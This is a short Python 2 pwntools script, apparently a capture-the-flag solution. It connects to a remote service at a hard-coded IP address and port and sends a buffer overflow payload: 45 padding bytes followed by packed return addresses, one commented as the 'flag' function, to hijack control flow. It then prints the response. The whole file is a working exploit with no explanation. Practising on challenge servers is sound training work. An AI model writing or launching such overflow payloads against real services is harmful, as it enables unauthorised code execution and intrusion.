#!/usr/bin/python
from pwn import *

r = remote("54.175.35.248", 8006)

buff   = 'a'*45
buff += p32(0x080489a0)#function flag
buff += p32(0x804f0a0)
buff += p32(0x80cdd44)
buff += p32(0x80eca2d)

r.sendline(buff)
print r.recv()
